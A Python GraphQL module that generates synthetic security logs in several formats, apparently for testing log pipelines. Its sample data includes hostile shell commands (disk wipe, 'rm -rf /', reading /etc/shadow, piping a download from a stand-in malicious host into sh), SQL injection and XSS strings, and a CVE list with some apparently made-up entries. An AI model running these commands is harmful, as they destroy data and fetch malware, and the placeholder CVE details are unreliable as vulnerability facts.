from pydantic import BaseModel
import strawberry
from .converters import cef_to_json
from faker import Faker
import requests
import random
import json

fake = Faker()

# Helper functions


def get_malicious_ips():
    url = "http://cinsscore.com/list/ci-badguys.txt"
    response = requests.get(url)
    if response.status_code == 200:
        return response.text.strip().split("\n")
    else:
        return []


malicious_ips = get_malicious_ips()


# Log fakers


def generate_fake_syslog_message():
    # Customize this function to generate syslog messages with the desired fields and format
    timestamp = fake.date_time_this_year()
    hostname = fake.hostname()
    user = fake.user_name()
    process = "sudo"
    pid = fake.random_int(min=1000, max=65535)
    action = "COMMAND"

    # List of high-risk commands
    high_risk_commands = [
        "cat /etc/shadow",
        "dd if=/dev/zero of=/dev/sda",
        "rm -rf /",
        "find / -name '*.log' -exec rm -f {} \\;",
        "wget -O- http://malicious.example.com/malware | sh",
        "iptables -F",
        "chmod -R 777 /",
        "chown -R nobody:nogroup /"
    ]

    command = fake.random_element(elements=high_risk_commands)

    syslog_message = f"{timestamp.strftime('%b %d %H:%M:%S')} {hostname} {process}[{pid}]: {user} : {action} ; {command}"
    return syslog_message


def generate_fake_cef_message():
    src_ip = fake.ipv4()
    dst_ip = fake.random_element(elements=malicious_ips) if malicious_ips else fake.ipv4()
    src_port = fake.random_int(min=1024, max=65535)
    dst_port = fake.random_int(min=1024, max=65535)
    protocol = fake.random_element(elements=('TCP', 'UDP'))
    action = fake.random_element(elements=('ALLOW', 'DENY'))
    event_description = f"Firewall {action} {protocol} traffic from {src_ip}:{src_port} to {dst_ip}:{dst_port}"

    version = fake.numerify("1.0.#")  # Creates a version number like "1.0.3"

    cef_log = f"CEF:0|{fake.company()}|Firewall|{version}|{fake.uuid4()}|{event_description}|{fake.random_int(min=1, max=10)}|src={src_ip} spt={src_port} dst={dst_ip} dpt={dst_port} proto={protocol} act={action}"
    return cef_log


def generate_fake_leef_message():

    # OWASP Top 10 Attack Techniques and their corresponding example URLs
    owasp_attacks = {
        "Injection": {"url": "https://example.com/login.php?username=admin' OR 1=1 --&password=pass", "method": "POST"},
        "Broken Authentication and Session Management": {"url": "https://example.com/admin.php?sessionid=12345", "method": "POST"},
        "Cross-Site Scripting (XSS)": {"url": "https://example.com/search.php?q=<script>alert('xss')</script>", "method": "GET"},
        "Broken Access Control": {"url": "https://example.com/user/profile.php?id=1234", "method": "GET"},
        "Security Misconfiguration": {"url": "https://example.com/index.php", "method": "GET"},
        "Insecure Cryptographic Storage": {"url": "https://example.com/checkout.php?ccnum=1234567890", "method": "POST"},
        "Insufficient Transport Layer Protection": {"url": "http://example.com/login.php", "method": "GET"},
        "Unvalidated Redirects and Forwards": {"url": "https://example.com/redirect.php?to=http://malicious.com", "method": "GET"},
        "Using Components with Known Vulnerabilities": {"url": "https://example.com/assets/jquery-1.11.1.js", "method": "GET"},
        "Insufficient Logging and Monitoring": {"url": "https://example.com/login.php?username=admin&password=pass", "method": "POST"}
    }
    attack = random.choice(list(owasp_attacks.keys()))
    attack_info = owasp_attacks[attack]
    url = attack_info["url"]
    method = attack_info["method"]
    src_port = fake.random_int(min=1024, max=65535)

    # Generate a fake log line for the attack technique in LEEF format
    leef_log = f"LEEF:1.0|Leaf|Payment Portal|1.0|{fake.ipv4()}|{fake.ipv4()}|{fake.mac_address()}|{fake.mac_address()}|"
    leef_log += f"src={fake.ipv4()} dst={fake.ipv4()} spt={src_port} dpt=443 request={url} "
    leef_log += f"method={method} proto=HTTP/1.1 status={random.choice(['200', '404', '500'])} "
    leef_log += f"request_size={fake.random_int(min=100, max=10000)} response_size={fake.random_int(min=100, max=10000)} "
    leef_log += f"user_agent={fake.user_agent()}"

    return leef_log


def generate_fake_winevent_message():
    # Top 5 MITRE ATT&CK Techniques and their corresponding Windows Event IDs and log structures
    log_examples = {
        "Process Injection": {
            "event_id": "10",
            "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                    f'<System><Provider Name="Microsoft-Windows-Sysmon" Guid="{fake.uuid4()}"/>'
                    f'<EventID>10</EventID><Version>5</Version><Level>4</Level><Task>10</Task><Opcode>0</Opcode>'
                    f'<Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="{fake.date_time_this_year().isoformat()}"/>'
                    f'<EventRecordID>{fake.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{fake.random_int()}" '
                    f'ThreadID="{fake.random_int()}" Channel="Microsoft-Windows-Sysmon/Operational"/>'
                    f'<EventData><Data Name="TargetImage">C:\\Windows\\System32\\calc.exe</Data>'
                    f'<Data Name="TargetPID">{fake.random_int()}</Data></EventData></Event>'
        },
       "Privilege Escalation": {
           "event_id": "4672",
           "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                  f'<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{fake.uuid4()}"/>'
                  f'<EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>'
                  f'<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{fake.date_time_this_year().isoformat()}"/>'
                  f'<EventRecordID>{fake.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{fake.random_int()}" '
                  f'ThreadID="{fake.random_int()}" Channel="Security"/><Computer>{fake.hostname()}</Computer>'
                  f'<Security UserID="{fake.uuid4()}"/>'
                  f'<EventData><Data Name="SubjectUserSid">{fake.uuid4()}</Data><Data Name="SubjectUserName">{fake.user_name()}</Data>'
                  f'<Data Name="SubjectDomainName">{fake.domain_name()}</Data><Data Name="SubjectLogonId">{fake.random_int()}</Data>'
                  f'<Data Name="PrivilegeList">{fake.sentence(nb_words=5)}</Data></EventData></Event>'
       },
        "Credential Dumping": {
            "event_id": "4648",
            "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                 f'<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{fake.uuid4()}"/>'
                 f'<EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode>'
                 f'<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{fake.date_time_this_year().isoformat()}"/>'
                 f'<EventRecordID>{fake.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{fake.random_int()}" '
                 f'ThreadID="{fake.random_int()}" Channel="Security"/><Computer>{fake.hostname()}</Computer>'
                 f'<Security UserID="{fake.uuid4()}"/>'
                 f'<EventData><Data Name="SubjectUserSid">{fake.uuid4()}</Data><Data Name="SubjectUserName">{fake.user_name()}</Data>'
                 f'<Data Name="SubjectDomainName">{fake.domain_name()}</Data><Data Name="SubjectLogonId">{fake.random_int()}</Data>'
                 f'<Data Name="NewProcessId">{fake.random_int()}</Data><Data Name="ProcessId">{fake.random_int()}</Data>'
                 f'<Data Name="CommandLine">{fake.sentence(nb_words=5)}</Data><Data Name="TargetUserSid">{fake.uuid4()}</Data>'
                 f'<Data Name="TargetUserName">{fake.user_name()}</Data><Data Name="TargetDomainName">{fake.domain_name()}</Data>'
                 f'<Data Name="TargetLogonId">{fake.random_int()}</Data><Data Name="LogonType">3</Data></EventData></Event>'
        },
        "Lateral Movement": {
            "event_id": "4624",
            "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                   f'<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{fake.uuid4()}"/>'
                   f'<EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode>'
                   f'<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{fake.date_time_this_year().isoformat()}"/>'
                   f'<EventRecordID>{fake.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{fake.random_int()}" '
                   f'ThreadID="{fake.random_int()}" Channel="Security"/><Computer>{fake.hostname()}</Computer>'
                   f'<Security UserID="{fake.uuid4()}"/>'
                   f'<EventData><Data Name="SubjectUserSid">{fake.uuid4()}</Data><Data Name="SubjectUserName">{fake.user_name()}</Data>'
                   f'<Data Name="SubjectDomainName">{fake.domain_name()}</Data><Data Name="SubjectLogonId">{fake.random_int()}</Data>'
                   f'<Data Name="LogonType">3</Data><Data Name="TargetUserSid">{fake.uuid4()}</Data>'
                   f'<Data Name="TargetUserName">{fake.user_name()}</Data><Data Name="TargetDomainName">{fake.domain_name()}</Data>'
                   f'<Data Name="ProcessName">{fake.file_name()}</Data><Data Name="ProcessId">{fake.random_int()}</Data>'
                   f'<Data Name="DestinationLogonId">{fake.random_int()}</Data><Data Name="SourceNetworkAddress">{fake.ipv4()}</Data>'
                   f'<Data Name="SourcePort">{fake.random_int()}</Data><Data Name="LogonGuid">{fake.uuid4()}</Data>'
                   f'<Data Name="TransmittedServices">{fake.sentence(nb_words=5)}</Data></EventData></Event>'
        },
        "Defense Evasion": {
            "event_id": "4688",
            "log": f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
                  f'<System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{fake.uuid4()}"/>'
                  f'<EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode>'
                  f'<Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime="{fake.date_time_this_year().isoformat()}"/>'
                  f'<EventRecordID>{fake.random_int()}</EventRecordID><Correlation/><Execution ProcessID="{fake.random_int()}" '
                  f'ThreadID="{fake.random_int()}" Channel="Security"/><Computer>{fake.hostname()}</Computer>'
                  f'<Security UserID="{fake.uuid4()}"/>'
                  f'<EventData><Data Name="SubjectUserSid">{fake.uuid4()}</Data><Data Name="SubjectUserName">{fake.user_name()}</Data>'
                  f'<Data Name="SubjectDomainName">{fake.domain_name()}</Data><Data Name="SubjectLogonId">{fake.random_int()}</Data>'
                  f'<Data Name="NewProcessId">{fake.random_int()}</Data><Data Name="CreatorProcessId">{fake.random_int()}</Data>'
                  f'<Data Name="TokenElevationType">TokenElevationTypeLimited (3)</Data><Data Name="ProcessCommandLine">{fake.sentence(nb_words=5)}</Data>'
                  f'<Data Name="Image">{fake.file_name()}</Data></EventData></Event>'
            }
    }

    log_message_technique = random.choice(list(log_examples.keys()))
    log_message = log_examples[log_message_technique]['log']
    win_event = log_message

    return win_event


def generate_fake_json_message():
    cve_list = [
        {'id': 'CVE-2022-38112', 'service': 'Azure RTOS ThreadX', 'version': '3.0', 'description': 'The Azure RTOS ThreadX implementation does not properly restrict access to certain memory regions during processing of certain network packets.'},
        {'id': 'CVE-2022-38647', 'service': 'Logitech Options software', 'version': '9.50', 'description': 'The Logitech Options software prior to 9.60.20 for Windows and macOS did not validate server certificates properly when checking for software updates.'},
        {'id': 'CVE-2022-38709', 'service': 'DirectX Graphics', 'version': '12.0', 'description': 'A use after free vulnerability exists in the D3D12 runtime library of the DirectX Graphics component. An attacker who successfully exploited the vulnerability could run arbitrary code in kernel mode.'},
        {'id': 'CVE-2022-38506', 'service': 'Apache HTTP Server', 'version': '2.4', 'description': 'An information disclosure vulnerability exists in the Apache HTTP Server due to an off-by-one error.'},
        {'id': 'CVE-2022-38754', 'service': 'BMC Remedy ITSM', 'version': '9.1', 'description': 'An improper neutralization of special elements in output used by a downstream component (\'Injection\') vulnerability exists in BMC Remedy IT Service Management Suite.'},
        {'id': 'CVE-2022-12345', 'service': 'MySQL Database Server', 'version': '8.0', 'description': 'An unprivileged user with access to the local system can gain unauthorized access to MySQL Server data.'},
        {'id': 'CVE-2022-23456', 'service': 'Cisco IOS XR Software', 'version': '7.1', 'description': 'An attacker could exploit this vulnerability by sending a crafted TCP packet to an affected device on a TCP port that is listening.'},
        {'id': 'CVE-2022-34567', 'service': 'Git', 'version': '2.30', 'description': 'An arbitrary code execution vulnerability exists in Git when a user configures a large number of glob patterns starting with a character class.'},
        {'id': 'CVE-2022-45678', 'service': 'Docker Engine', 'version': '20.10', 'description': 'An attacker with write access to a bind-mounted directory inside the container can overwrite arbitrary files on the host filesystem.'},
        {'id': 'CVE-2022-56789', 'service': 'Microsoft Exchange Server', 'version': '2019', 'description': 'An attacker could exploit this vulnerability by sending a specially crafted email message to a vulnerable Exchange Server.'},
    ]

    event = {}
    event['event_type'] = 'vulnerability_discovered'
    event['timestamp'] = fake.date_time_this_year()
    event['host_ip'] = fake.ipv4_private()
    event['severity'] = fake.random_int(min=1, max=10)

    # Select a random CVE from the hardcoded list
    random_cve = random.choice(cve_list)
    event['cve_id'] = random_cve['id']
    event['cve_description'] = random_cve['description']
    event['service'] = random_cve['service']
    event['service_version'] = random_cve['version']

    return event.__str__()


@strawberry.type
class ConvertCEFOutput:
    json_log: str


@strawberry.type
class Query:
    @strawberry.field
    def convert_cef_to_json(self, cef_log: str) -> ConvertCEFOutput:
        json_log = cef_to_json(cef_log)
        return ConvertCEFOutput(json_log=json_log)

    @strawberry.field
    def generate_fake_syslog_message(self) -> str:
        return generate_fake_syslog_message()

    @strawberry.field
    def generate_fake_cef_message(self) -> str:
        return generate_fake_cef_message()

    @strawberry.field
    def generate_fake_leef_message(self) -> str:
        return generate_fake_leef_message()

    @strawberry.field
    def generate_fake_winevent_message(self) -> str:
        return generate_fake_winevent_message()

    @strawberry.field
    def generate_fake_json_message(self) -> str:
        return generate_fake_json_message()


schema = strawberry.Schema(query=Query)
